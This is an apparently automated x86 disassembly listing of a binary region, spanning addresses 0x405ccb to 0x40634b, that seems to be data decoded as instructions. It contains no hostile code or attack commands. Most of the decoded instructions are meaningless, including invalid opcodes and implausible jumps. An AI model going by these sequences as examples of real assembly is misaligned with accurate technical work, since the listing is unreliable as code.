  405ccb:	25 2b 00 06 00       	and    $0x6002b,%eax
  405cd0:	57                   	push   %edi
  405cd1:	1d 5b 05 06 00       	sbb    $0x6055b,%eax
  405cd6:	62 15 5b 05 0a 00    	bound  %edx,0xa055b
  405cdc:	35 0e 99 1e 06       	xor    $0x61e990e,%eax
  405ce1:	00 af 1a 5b 05 0a    	add    %ch,0xa055b1a(%edi)
  405ce7:	00 53 0e             	add    %dl,0xe(%ebx)
  405cea:	99                   	cltd
  405ceb:	1e                   	push   %ds
  405cec:	06                   	push   %es
  405ced:	00 0c 26             	add    %cl,(%esi,%eiz,1)
  405cf0:	2b 00                	sub    (%eax),%eax
  405cf2:	16                   	push   %ss
  405cf3:	00 d2                	add    %dl,%dl
  405cf5:	1f                   	pop    %ds
  405cf6:	a2 0a 06 00 d1       	mov    %al,0xd100060a
  405cfb:	16                   	push   %ss
  405cfc:	2b 00                	sub    (%eax),%eax
  405cfe:	06                   	push   %es
  405cff:	00 05 0e 5b 05 06    	add    %al,0x6055b0e
  405d05:	00 d1                	add    %dl,%cl
  405d07:	17                   	pop    %ss
  405d08:	5b                   	pop    %ebx
  405d09:	05 06 00 d6 0c       	add    $0xcd60006,%eax
  405d0e:	5b                   	pop    %ebx
  405d0f:	05 06 00 64 1d       	add    $0x1d640006,%eax
  405d14:	5b                   	pop    %ebx
  405d15:	05 06 00 a5 1a       	add    $0x1aa50006,%eax
  405d1a:	5b                   	pop    %ebx
  405d1b:	05 16 00 be 1a       	add    $0x1abe0016,%eax
  405d20:	ac                   	lods   %ds:(%esi),%al
  405d21:	1e                   	push   %ds
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	0a 1d 49 22 1a 00    	or     0x1a2249,%bl
  405d2a:	ec                   	in     (%dx),%al
  405d2b:	19 49 22             	sbb    %ecx,0x22(%ecx)
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	b2 1d                	mov    $0x1d,%dl
  405d32:	00 00                	add    %al,(%eax)
  405d34:	1a 00                	sbb    (%eax),%al
  405d36:	4c                   	dec    %esp
  405d37:	21 49 22             	and    %ecx,0x22(%ecx)
  405d3a:	06                   	push   %es
  405d3b:	00 5f 1e             	add    %bl,0x1e(%edi)
  405d3e:	36 18 06             	sbb    %al,%ss:(%esi)
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	36 18 06             	sbb    %al,%ss:(%esi)
  405d47:	00 2d 18 36 18 06    	add    %ch,0x6183618
  405d4d:	00 68 00             	add    %ch,0x0(%eax)
  405d50:	36 18 06             	sbb    %al,%ss:(%esi)
  405d53:	00 51 1c             	add    %dl,0x1c(%ecx)
  405d56:	86 25 06 00 73 18    	xchg   %ah,0x18730006
  405d5c:	86 25 06 00 ec 0e    	xchg   %ah,0xeec0006
  405d62:	36 18 06             	sbb    %al,%ss:(%esi)
  405d65:	00 f0                	add    %dh,%al
  405d67:	18 36                	sbb    %dh,(%esi)
  405d69:	18 1e                	sbb    %bl,(%esi)
  405d6b:	00 95 19 31 20 06    	add    %dl,0x6203119(%ebp)
  405d71:	00 4f 26             	add    %cl,0x26(%edi)
  405d74:	4c                   	dec    %esp
  405d75:	17                   	pop    %ss
  405d76:	06                   	push   %es
  405d77:	00 66 17             	add    %ah,0x17(%esi)
  405d7a:	4c                   	dec    %esp
  405d7b:	17                   	pop    %ss
  405d7c:	06                   	push   %es
  405d7d:	00 13                	add    %dl,(%ebx)
  405d7f:	0e                   	push   %cs
  405d80:	4c                   	dec    %esp
  405d81:	17                   	pop    %ss
  405d82:	06                   	push   %es
  405d83:	00 41 0b             	add    %al,0xb(%ecx)
  405d86:	36 18 06             	sbb    %al,%ss:(%esi)
  405d89:	00 f1                	add    %dh,%cl
  405d8b:	0d 6b 13 0a 00       	or     $0xa136b,%eax
  405d90:	23 1d 2b 00 0a 00    	and    0xa002b,%ebx
  405d96:	f1                   	int1
  405d97:	20 2b                	and    %ch,(%ebx)
  405d99:	00 06                	add    %al,(%esi)
  405d9b:	00 6f 0c             	add    %ch,0xc(%edi)
  405d9e:	2b 00                	sub    (%eax),%eax
  405da0:	43                   	inc    %ebx
  405da1:	00 ef                	add    %ch,%bh
  405da3:	1d 00 00 12 00       	sbb    $0x120000,%eax
  405da8:	7f 0d                	jg     0x405db7
  405daa:	f6 1b                	negb   (%ebx)
  405dac:	06                   	push   %es
  405dad:	00 0b                	add    %cl,(%ebx)
  405daf:	00 87 0a 06 00 07    	add    %al,0x700060a(%edi)
  405db5:	19 36                	sbb    %esi,(%esi)
  405db7:	18 06                	sbb    %al,(%esi)
  405db9:	00 a3 25 c0 19 06    	add    %ah,0x619c025(%ebx)
  405dbf:	00 6e 0f             	add    %ch,0xf(%esi)
  405dc2:	36 18 06             	sbb    %al,%ss:(%esi)
  405dc5:	00 fa                	add    %bh,%dl
  405dc7:	1d 36 18 06 00       	sbb    $0x61836,%eax
  405dcc:	cd 0d                	int    $0xd
  405dce:	36 18 22             	sbb    %ah,%ss:(%edx)
  405dd1:	00 cb                	add    %cl,%bl
  405dd3:	1a aa 1c 22 00 a8    	sbb    -0x57ffdde4(%edx),%ch
  405dd9:	1f                   	pop    %ds
  405dda:	aa                   	stos   %al,%es:(%edi)
  405ddb:	1c 22                	sbb    $0x22,%al
  405ddd:	00 d1                	add    %dl,%cl
  405ddf:	1c aa                	sbb    $0xaa,%al
  405de1:	1c 12                	sbb    $0x12,%al
  405de3:	00 c9                	add    %cl,%cl
  405de5:	1c e9                	sbb    $0xe9,%al
  405de7:	1e                   	push   %ds
  405de8:	22 00                	and    (%eax),%al
  405dea:	c0 1f aa             	rcrb   $0xaa,(%edi)
  405ded:	1c 06                	sbb    $0x6,%al
  405def:	00 7f 1f             	add    %bh,0x1f(%edi)
  405df2:	86 25 06 00 41 1a    	xchg   %ah,0x1a410006
  405df8:	36 18 06             	sbb    %al,%ss:(%esi)
  405dfb:	00 86 1f 86 25 12    	add    %al,0x1225861f(%esi)
  405e01:	00 83 1c 86 25 06    	add    %al,0x625861c(%ebx)
  405e07:	00 f4                	add    %dh,%ah
  405e09:	17                   	pop    %ss
  405e0a:	86 25 06 00 7f 00    	xchg   %ah,0x7f0006
  405e10:	86 25 06 00 2b 1a    	xchg   %ah,0x1a2b0006
  405e16:	36 18 06             	sbb    %al,%ss:(%esi)
  405e19:	00 4c 18 86          	add    %cl,-0x7a(%eax,%ebx,1)
  405e1d:	25 06 00 1b 0d       	and    $0xd1b0006,%eax
  405e22:	86 25 06 00 df 0c    	xchg   %ah,0xcdf0006
  405e28:	86 25 06 00 98 18    	xchg   %ah,0x18980006
  405e2e:	86 25 06 00 fa 0c    	xchg   %ah,0xcfa0006
  405e34:	86 25 06 00 14 1a    	xchg   %ah,0x1a140006
  405e3a:	86 25 06 00 e7 1c    	xchg   %ah,0x1ce70006
  405e40:	36 18 06             	sbb    %al,%ss:(%esi)
  405e43:	00 31                	add    %dh,(%ecx)
  405e45:	25 36 18 06 00       	and    $0x61836,%eax
  405e4a:	8a 20                	mov    (%eax),%ah
  405e4c:	e9 1e 06 00 aa       	jmp    0xaa40646f
  405e51:	0d 36 18 06 00       	or     $0x61836,%eax
  405e56:	01 0b                	add    %ecx,(%ebx)
  405e58:	86 25 06 00 5f 00    	xchg   %ah,0x5f0006
  405e5e:	36 18 06             	sbb    %al,%ss:(%esi)
  405e61:	00 98 0d 36 18 06    	add    %bl,0x618360d(%eax)
  405e67:	00 fe                	add    %bh,%dh
  405e69:	0d 36 18 06 00       	or     $0x61836,%eax
  405e6e:	a9 20 5b 05 06       	test   $0x6055b20,%eax
  405e73:	00 7f 0f             	add    %bh,0xf(%edi)
  405e76:	5b                   	pop    %ebx
  405e77:	05 0a 00 01 18       	add    $0x1801000a,%eax
  405e7c:	7f 19                	jg     0x405e97
  405e7e:	0a 00                	or     (%eax),%al
  405e80:	0b 0d 7f 19 00 00    	or     0x197f,%ecx
  405e86:	00 00                	add    %al,(%eax)
  405e88:	93                   	xchg   %eax,%ebx
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 e3                	add    %ah,%bl
  405e97:	08 86 18 05 00 01    	or     %al,0x1000518(%esi)
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 8a    	add    %al,-0x75ffefff(%ecx)
  405ea5:	02 86 18 05 00 01    	add    0x1000518(%esi),%al
  405eab:	00 03                	add    %al,(%ebx)
  405ead:	00 81 01 10 00 ec    	add    %al,-0x13ffefff(%ecx)
  405eb3:	26 b2 12             	es mov $0x12,%dl
  405eb6:	05 00 13 00 06       	add    $0x6001300,%eax
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 ec                	add    %ch,%ah
  405ec1:	12 0e                	adc    (%esi),%cl
  405ec3:	01 05 00 1e 00 24    	add    %eax,0x24001e00
  405ec9:	00 00                	add    %al,(%eax)
  405ecb:	00 10                	add    %dl,(%eax)
  405ecd:	00 f4                	add    %dh,%ah
  405ecf:	15 04 07 05 00       	adc    $0x50704,%eax
  405ed4:	1e                   	push   %ds
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 d5    	add    %al,-0x2affefff(%ecx)
  405edd:	04 04                	add    $0x4,%al
  405edf:	07                   	pop    %es
  405ee0:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405ee5:	00 81 01 10 00 b7    	add    %al,-0x48ffefff(%ecx)
  405eeb:	08 04 07             	or     %al,(%edi,%eax,1)
  405eee:	05 00 1e 00 2f       	add    $0x2f001e00,%eax
  405ef3:	00 81 01 10 00 f7    	add    %al,-0x8ffefff(%ecx)
  405ef9:	03 04 07             	add    (%edi,%eax,1),%eax
  405efc:	05 00 1e 00 30       	add    $0x30001e00,%eax
  405f01:	00 81 01 10 00 8b    	add    %al,-0x74ffefff(%ecx)
  405f07:	1e                   	push   %ds
  405f08:	04 07                	add    $0x7,%al
  405f0a:	05 00 1e 00 36       	add    $0x36001e00,%eax
  405f0f:	00 81 01 10 00 1b    	add    %al,0x1b001001(%ecx)
  405f15:	24 04                	and    $0x4,%al
  405f17:	07                   	pop    %es
  405f18:	05 00 1f 00 38       	add    $0x38001f00,%eax
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 dc                	add    %bl,%ah
  405f23:	12 00                	adc    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 65    	add    %al,0x65001001(%ecx)
  405f31:	1b 04 07             	sbb    (%edi,%eax,1),%eax
  405f34:	05 00 23 00 3e       	add    $0x3e002300,%eax
  405f39:	00 81 01 10 00 7b    	add    %al,0x7b001001(%ecx)
  405f3f:	02 04 07             	add    (%edi,%eax,1),%al
  405f42:	05 00 23 00 41       	add    $0x41002300,%eax
  405f47:	00 81 01 10 00 68    	add    %al,0x68001001(%ecx)
  405f4d:	09 bd 18 05 00 24    	or     %edi,0x24000518(%ebp)
  405f53:	00 46 00             	add    %al,0x0(%esi)
  405f56:	83 01 10             	addl   $0x10,(%ecx)
  405f59:	00 09                	add    %cl,(%ecx)
  405f5b:	13 00                	adc    (%eax),%eax
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 47 1e             	add    %al,0x1e(%edi)
  405f6a:	4b                   	dec    %ebx
  405f6b:	06                   	push   %es
  405f6c:	05 00 26 00 4b       	add    $0x4b002600,%eax
  405f71:	00 81 01 10 00 f4    	add    %al,-0xbffefff(%ecx)
  405f77:	06                   	push   %es
  405f78:	4b                   	dec    %ebx
  405f79:	06                   	push   %es
  405f7a:	05 00 2d 00 52       	add    $0x52002d00,%eax
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 fb                	add    %bh,%bl
  405f85:	12 00                	adc    (%eax),%al
  405f87:	00 05 00 2d 00 54    	add    %al,0x54002d00
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 61 01             	add    %ah,0x1(%ecx)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	51                   	push   %ecx
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 8d 01 b5 01 05    	add    %cl,0x501b501(%ebp)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 c0                	add    %al,%al
  405faf:	05 b5 01 05 00       	add    $0x501b5,%eax
  405fb4:	2f                   	das
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	88 12                	mov    %dl,(%edx)
  405fbe:	b5 01                	mov    $0x1,%ch
  405fc0:	05 00 31 00 63       	add    $0x63003100,%eax
  405fc5:	00 01                	add    %al,(%ecx)
  405fc7:	00 10                	add    %dl,(%eax)
  405fc9:	00 9a 04 b5 01 05    	add    %bl,0x501b504(%edx)
  405fcf:	00 33                	add    %dh,(%ebx)
  405fd1:	00 6a 00             	add    %ch,0x0(%edx)
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	cc                   	int3
  405fd9:	09 b5 01 39 00 3a    	or     %esi,0x3a003901(%ebp)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 c4                	add    %al,%ah
  405fe7:	08 b5 01 05 00 47    	or     %dh,0x47000501(%ebp)
  405fed:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405ff3:	00 ca                	add    %cl,%dl
  405ff5:	00 b5 01 05 00 47    	add    %dh,0x47000501(%ebp)
  405ffb:	00 99 00 81 01 10    	add    %bl,0x10018100(%ecx)
  406001:	00 7f 1e             	add    %bh,0x1e(%edi)
  406004:	b5 01                	mov    $0x1,%ch
  406006:	05 00 47 00 a2       	add    $0xa2004700,%eax
  40600b:	00 00                	add    %al,(%eax)
  40600d:	01 00                	add    %eax,(%eax)
  40600f:	00 95 07 00 00 05    	add    %dl,0x5000007(%ebp)
  406015:	00 47 00             	add    %al,0x0(%edi)
  406018:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 ce                	add    %cl,%dh
  40601f:	15 00 00 51 00       	adc    $0x510000,%eax
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 72 0d 	add    %ah,0xd720016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 4b 13             	add    %cl,0x13(%ebx)
  406032:	12 00                	adc    (%eax),%al
  406034:	16                   	push   %ss
  406035:	00 b8 23 12 00 16    	add    %bh,0x16001223(%eax)
  40603b:	00 6f 01             	add    %ch,0x1(%edi)
  40603e:	12 00                	adc    (%eax),%al
  406040:	16                   	push   %ss
  406041:	00 85 16 12 00 16    	add    %al,0x16001216(%ebp)
  406047:	00 7a 0a             	add    %bh,0xa(%edx)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 22                	add    %ah,(%edx)
  40604f:	20 12                	and    %dl,(%edx)
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 39                	add    %bh,(%ecx)
  406055:	06                   	push   %es
  406056:	12 00                	adc    (%eax),%al
  406058:	16                   	push   %ss
  406059:	00 dc                	add    %bl,%ah
  40605b:	15 12 00 16 00       	adc    $0x160012,%eax
  406060:	3d 04 12 00 16       	cmp    $0x16001204,%eax
  406065:	00 55 07             	add    %dl,0x7(%ebp)
  406068:	15 00 16 00 07       	adc    $0x7001600,%eax
  40606d:	1b 12                	sbb    (%edx),%edx
  40606f:	00 16                	add    %dl,(%esi)
  406071:	00 03                	add    %al,(%ebx)
  406073:	05 19 00 16 00       	add    $0x160019,%eax
  406078:	16                   	push   %ss
  406079:	21 12                	and    %edx,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 9b 08 12 00 16    	add    %bl,0x16001208(%ebx)
  406083:	00 05 21 12 00 16    	add    %al,0x16001221
  406089:	00 76 06             	add    %dh,0x6(%esi)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 a8 04 12 00 11    	add    %ch,0x11001204(%eax)
  406095:	00 4d 0c             	add    %cl,0xc(%ebp)
  406098:	21 00                	and    %eax,(%eax)
  40609a:	11 00                	adc    %eax,(%eax)
  40609c:	32 0c 25 00 11 00 02 	xor    0x2001100(,%eiz,1),%cl
  4060a3:	0c 29                	or     $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 98 0b 2d 00 11    	add    %bl,0x11002d0b(%eax)
  4060ad:	00 1a                	add    %bl,(%edx)
  4060af:	0c 2d                	or     $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 7d 0b             	add    %bh,0xb(%ebp)
  4060b6:	30 00                	xor    %al,(%eax)
  4060b8:	11 00                	adc    %eax,(%eax)
  4060ba:	60                   	pusha
  4060bb:	0b 34 00             	or     (%eax,%eax,1),%esi
  4060be:	31 00                	xor    %eax,(%eax)
  4060c0:	46                   	inc    %esi
  4060c1:	0b 37                	or     (%edi),%esi
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 b4 0b 30 00 11 00 	add    %dh,0x110030(%ebx,%ecx,1)
  4060cc:	e8 0b 3a 00 11       	call   0x11409adc
  4060d1:	00 ca                	add    %cl,%dl
  4060d3:	0b 34 00             	or     (%eax,%eax,1),%esi
  4060d6:	16                   	push   %ss
  4060d7:	00 fd                	add    %bh,%ch
  4060d9:	09 dc                	or     %ebx,%esp
  4060db:	00 06                	add    %al,(%esi)
  4060dd:	06                   	push   %es
  4060de:	93                   	xchg   %eax,%ebx
  4060df:	09 06                	or     %eax,(%esi)
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	40                   	inc    %eax
  4060e5:	05 09 01 56 80       	add    $0x80560109,%eax
  4060ea:	e9 1b 09 01 56       	jmp    0x56416a0a
  4060ef:	80 17 0f             	adcb   $0xf,(%edi)
  4060f2:	09 01                	or     %eax,(%ecx)
  4060f4:	31 00                	xor    %eax,(%eax)
  4060f6:	d3 14 12             	rcll   %cl,(%edx,%edx,1)
  4060f9:	00 16                	add    %dl,(%esi)
  4060fb:	00 be 26 30 01 16    	add    %bh,0x16013026(%esi)
  406101:	00 79 16             	add    %bh,0x16(%ecx)
  406104:	43                   	inc    %ebx
  406105:	01 51 80             	add    %edx,-0x80(%ecx)
  406108:	5e                   	pop    %esi
  406109:	16                   	push   %ss
  40610a:	3a 00                	cmp    (%eax),%al
  40610c:	51                   	push   %ecx
  40610d:	80 a2 1b 3a 00 51 80 	andb   $0x80,0x51003a1b(%edx)
  406114:	e5 07                	in     $0x7,%eax
  406116:	3a 00                	cmp    (%eax),%al
  406118:	51                   	push   %ecx
  406119:	80 d2 23             	adc    $0x23,%dl
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	2f                   	das
  406121:	0a 29                	or     (%ecx),%ch
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 41 16             	add    %al,0x16(%ecx)
  406128:	29 00                	sub    %eax,(%eax)
  40612a:	31 00                	xor    %eax,(%eax)
  40612c:	1b 09                	sbb    (%ecx),%ecx
  40612e:	29 00                	sub    %eax,(%eax)
  406130:	33 01                	xor    (%ecx),%eax
  406132:	2a 06                	sub    (%esi),%al
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406139:	15 8f 01 01 00       	adc    $0x1018f,%eax
  40613e:	a8 0c                	test   $0xc,%al
  406140:	30 01                	xor    %al,(%ecx)
  406142:	01 00                	add    %eax,(%eax)
  406144:	91                   	xchg   %eax,%ecx
  406145:	1b 3a                	sbb    (%edx),%edi
  406147:	00 01                	add    %al,(%ecx)
  406149:	00 a8 0c 30 01 01    	add    %ch,0x101300c(%eax)
  40614f:	00 d1                	add    %dl,%cl
  406151:	01 c7                	add    %eax,%edi
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 31                	add    %dh,(%ecx)
  406157:	05 12 00 01 00       	add    $0x10012,%eax
  40615c:	b0 24                	mov    $0x24,%al
  40615e:	12 00                	adc    (%eax),%al
  406160:	01 00                	add    %eax,(%eax)
  406162:	c7                   	(bad)
  406163:	24 37                	and    $0x37,%al
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 db                	add    %bl,%bl
  406169:	1b 02                	sbb    (%edx),%eax
  40616b:	02 01                	add    (%ecx),%al
  40616d:	00 54 0a c7          	add    %dl,-0x39(%edx,%ecx,1)
  406171:	01 01                	add    %eax,(%ecx)
  406173:	00 a8 0c 30 01 01    	add    %ch,0x101300c(%eax)
  406179:	00 8f 08 06 02 06    	add    %cl,0x6020608(%edi)
  40617f:	06                   	push   %es
  406180:	93                   	xchg   %eax,%ebx
  406181:	09 3a                	or     %edi,(%edx)
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	a8 01                	test   $0x1,%al
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 b9 00 02 02 56 80 	cmpb   $0x80,0x56020200(%ecx)
  406192:	84 06                	test   %al,(%esi)
  406194:	02 02                	add    (%edx),%al
  406196:	56                   	push   %esi
  406197:	80 3e 1b             	cmpb   $0x1b,(%esi)
  40619a:	02 02                	add    (%edx),%al
  40619c:	56                   	push   %esi
  40619d:	80 7d 05 02          	cmpb   $0x2,0x5(%ebp)
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	48                   	dec    %eax
  4061a5:	19 02                	sbb    %eax,(%edx)
  4061a7:	02 56 80             	add    -0x80(%esi),%dl
  4061aa:	17                   	pop    %ss
  4061ab:	17                   	pop    %ss
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 20 15             	andb   $0x15,(%eax)
  4061b2:	02 02                	add    (%edx),%al
  4061b4:	56                   	push   %esi
  4061b5:	80 1c 01 02          	sbbb   $0x2,(%ecx,%eax,1)
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	f6 04 02 02          	testb  $0x2,(%edx,%eax,1)
  4061c0:	56                   	push   %esi
  4061c1:	80 b3 05 02 02 56 80 	xorb   $0x80,0x56020205(%ebx)
  4061c8:	4a                   	dec    %edx
  4061c9:	08 02                	or     %al,(%edx)
  4061cb:	02 33                	add    (%ebx),%dh
  4061cd:	01 63 03             	add    %esp,0x3(%ebx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 f8                	add    %bh,%al
  4061db:	18 0a                	sbb    %cl,(%edx)
  4061dd:	00 01                	add    %al,(%ecx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	04 1e                	add    $0x1e,%al
  4061ea:	0e                   	push   %cs
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 cf                	add    %cl,%bh
  4061f7:	02 1d 00 01 00 50    	add    0x50000100,%bl
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 35 16 1d    	add    %dl,0x1d163500(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 0a 1e 0a    	add    %dl,0xa1e0a18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 18 22 3d    	add    %dl,0x3d221808(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 26 22 42    	add    %dl,0x42222608(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 fc 21 48    	add    %dl,0x4821fc08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 0a 22 4d    	add    %dl,0x4d220a08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 d8 1c 53    	add    %dl,0x531cd808(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 e3 1c 58    	add    %dl,0x581ce308(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 16 12 5e    	add    %dl,0x5e121608(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 25 12 62 00 04    	or     %ah,0x4006212
  406287:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  40628e:	91                   	xchg   %eax,%ecx
  40628f:	08 b3 21 5e 00 05    	or     %dh,0x5005e21(%ebx)
  406295:	00 c3                	add    %al,%bl
  406297:	20 00                	and    %al,(%eax)
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 be 21 62    	add    %dl,0x6221be08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 d7 11 67    	add    %dl,0x6711d708(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 e5 11 6c    	add    %dl,0x6c11e508(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 1d 0b 1d    	add    %dl,0x1d0b1d08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 2d 0b 72    	add    %dl,0x720b2d08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 b8 0a 77    	add    %dl,0x770ab808(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 59 13 67    	add    %dl,0x67135908(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 62 13 6c    	add    %dl,0x6c136208(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 77 17 7b    	add    %dl,0x7b177708(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 84 17 7f    	add    %dl,0x7f178408(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 4d 14 1d    	add    %dl,0x1d144d08(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 5e 14 72    	add    %dl,0x72145e08(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 ef 23 0a    	add    %dl,0xa23ef00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
